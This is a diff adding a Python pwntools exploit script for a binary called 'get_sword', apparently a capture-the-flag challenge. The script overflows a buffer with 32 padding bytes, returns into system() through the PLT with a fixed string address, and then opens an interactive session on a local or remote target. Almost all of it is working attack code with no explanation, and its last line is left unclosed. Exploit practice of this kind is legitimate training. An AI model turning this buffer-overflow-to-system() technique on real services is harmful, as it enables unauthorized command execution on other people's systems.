@@ -1,0 +1,56 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF(args.EXE or 'get_sword')
+elf = exe
+libc = elf.libc
+filterwarnings("ignore")
+context.log_level = 'debug'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+break *intro+105
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+    global elf
+
+    io = start()
+
+def leak():
+    offset = 32
+    cat = 0x804a068
+
+    payload = b'A'*offset
+    payload += p32(elf.plt['system'])
+    payload += p32(0x0)
+    payload += p32(cat)
+
+    io.sendline(payload)
+
+def main():
+    
+    init()
+    leak()
+
+if __name__ == '__main__':
+    main()
+
+    io.interactive(
